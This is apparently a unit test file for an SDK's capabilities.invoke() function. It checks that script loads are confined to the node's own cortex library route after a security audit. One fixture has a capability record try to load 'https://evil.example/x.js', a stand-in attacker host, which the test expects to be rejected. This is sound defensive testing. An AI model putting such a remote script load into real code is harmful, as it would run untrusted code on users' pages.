/**
 * @file test/unit/sdk-capabilities-cortex-script.test.ts
 * @description AIMEAT.capabilities.invoke() on a cortex capability loads a script only from this
 *   node's /v1/cortex/<name>/libs/ for the cortex the record names. A record whose free-text usage
 *   names any other address (another host, another cortex) loads nothing and says why; the address
 *   the node itself writes for an aggregated cortex still loads.
 * @version-history
 *   v1.0.0 — 2026-10-25 — Initial (secaudit2026oct22, capabilities.invoke usage script URL).
 */
import { describe, it, expect, beforeAll, beforeEach } from 'vitest';

const appended: string[] = [];
let record: Record<string, unknown> = {};
let invoke: (id: string, input?: unknown) => Promise<unknown>;

beforeAll(async () => {
  const g = globalThis as Record<string, any>;
  g.location = { origin: 'https://notes.apps.node.test', protocol: 'https:', href: 'https://notes.apps.node.test/' };
  g.self = g;
  g.document = {
    querySelector: () => null,
    createElement: () => ({}),
    head: { appendChild(s: { src: string; onload?: () => void }) { appended.push(s.src); queueMicrotask(() => s.onload?.()); } },
  };
  g.window = g;
  g.window.AIMEAT = { auth: { getSession: () => ({ fetch: async () => ({ ok: true, data: record }) }) } };
  await import('../../src/static/sdk-libs/capabilities/index.js');
  invoke = g.window.AIMEAT.capabilities.invoke;
});

beforeEach(() => { appended.length = 0; });

const cortexRecord = (usage: string) => ({ id: 'acme:widgets:render', source: { type: 'cortex', ref: 'cortex:widgets' }, usage, exports: [] });

describe('capabilities.invoke on a cortex capability', () => {
  it('a usage address on another host is never loaded', async () => {
    record = cortexRecord("await loadScript('https://evil.example/x.js')");
    await expect(invoke('acme:widgets:render', {})).rejects.toThrow(/outside this node's cortex route/);
    expect(appended).toEqual([]);
  });

  it('a usage address of another cortex on this node is not loaded either', async () => {
    record = cortexRecord("await loadScript('/v1/cortex/other/libs/other.js')");
    await expect(invoke('acme:widgets:render', {})).rejects.toThrow(/outside this node's cortex route/);
    expect(appended).toEqual([]);
  });

  it('the address the node writes for the named cortex is loaded', async () => {
    record = cortexRecord("await loadScript('/v1/cortex/widgets/libs/widgets.js')");
    await expect(invoke('acme:widgets:render', {})).rejects.toThrow(/export function not found/);
    expect(appended.length).toBe(1);
    expect(appended[0]!.endsWith('/v1/cortex/widgets/libs/widgets.js')).toBe(true);
  });
});
